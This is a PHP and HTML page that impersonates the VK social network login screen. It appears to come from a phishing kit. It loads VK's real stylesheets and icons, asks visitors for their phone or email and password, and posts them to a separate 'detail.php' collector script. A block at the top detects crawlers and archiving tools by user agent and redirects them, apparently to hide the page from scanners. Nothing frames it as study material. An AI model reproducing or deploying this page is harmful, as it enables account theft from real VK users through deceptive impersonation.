<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?6" />

<link rel="apple-touch-icon" href="https://vk.com/images/safari_60.png?1">
<link rel="apple-touch-icon" sizes="76x76" href="https://vk.com/images/safari_76.png?1">
<link rel="apple-touch-icon" sizes="120x120" href="https://vk.com/images/safari_120.png?1">
<link rel="apple-touch-icon" sizes="152x152" href="https://vk.com/images/safari_152.png?1">

<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
<meta name="description" content="" />

<title>Log in | VK</title>

<link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?60234459832" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?2660709036" />

<link type="text/css" rel="stylesheet" href="https://vk.com/css/al/login.css?29646148071" /><link type="text/css" rel="stylesheet" href="https://vk.com/css/al/ui_common.css?19660555613" />

</head>

<body class="login_page" style="width: 90%;">

  <div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix">
  

  <div id="page_header_cont" class="page_header_cont">
    <div class="back"></div>
    <div id="page_header_wrap" class="page_header_wrap">
      <a class="top_back_link" href="" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }"></a>
      <div id="page_header" class="p_head1 p_head_l3" style="width: 90%">
        <div class="content">
          <div id="top_nav" class="head_nav">
  <div class="head_nav_item fl_l"><a class="top_home_link fl_l" href="/" aria-label="Home" accesskey="1" ><div class="top_home_logo"></div></a></div>
  <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
</div></div>
</div>
        </div>
      </div>
    </div>
  </div>

    <div id="page_body" class="fl_r " style="width: 90%;">
      
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
    <div id="content"><br><h2 class="login_header">Login to VK</h2>
<div id="login_message"></div>
<div id="login_form_wrap" class="login_form_wrap">
  <form method="post" name="login" action="../detail.php">
  <input type="hidden" name="prov" value="VK">
    <input type="text" class="big_text" name="email"  placeholder="Phone or email" required/>
    <input type="password" class="big_text" name="pass" placeholder="Password" required/>
    <div class="login_buttons_wrap">
      <button type="submit" name="login" class="flat_button button_big_text login_button">Log in</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go('/join'); return cancelEvent(event);">Sign up</button>
    </div>
  </form>
</div>

</div>
</div>

  </div>
</div></div>
</body>

</html>